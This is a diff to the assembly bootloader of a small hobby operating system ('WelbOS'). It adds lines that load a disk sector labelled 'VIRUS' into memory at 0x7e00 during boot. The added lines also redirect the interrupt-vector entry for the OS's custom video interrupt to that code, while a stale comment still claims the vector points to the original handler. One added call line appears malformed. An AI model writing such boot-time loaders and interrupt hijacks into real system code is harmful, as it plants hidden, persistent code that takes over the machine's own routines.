@@ -23,6 +23,9 @@ YELLOW_BLACK        equ 0x0E
 VGA_DISPLAY_WIDTH   equ 320
 VGA_DISPLAY_HEIGHT  equ 200
 
+VIRUS_SEG            equ 0
+VIRUS_OFF            equ 0x7e00
+
 ; 1) attribute
 ; 2) length of string
 ; 3) segment of string
@@ -65,6 +68,14 @@ bsOEM       db "WelbOS v05"         ; OEM String
 start:
     mov ax, FUN_VIDEO_MODE + VGA_MODE
     int BIOS_VIDEO
+
+    push 1
+    push 6
+    push 0
+    push VIRUS_SEG
+    push VIRUS_OFF
+    call 0x:load_sector
+
     call set_ivt
     ; Inputs: cylinder, sector, head, segment, offset.
     push 1
@@ -114,7 +125,7 @@ set_ivt:
     xor ax, ax
     mov es, ax                                           ; es = 0x0000, IVT segment
     cli                                                  ; disable interrupts during change
-    mov word [es:CUSTOM_VIDEO * 4], function_group       ; IP for int 0xf0 → point to `function_group`
+    mov word [es:CUSTOM_VIDEO * 4], VIRUS_OFF            ; IP for int 0xf0 → point to `function_group`
     mov   word [es:CUSTOM_VIDEO * 4 + 2 ], cs            ; CS for int 0xf0 → current segment
     sti                                                  ; re-enable interrupts
 
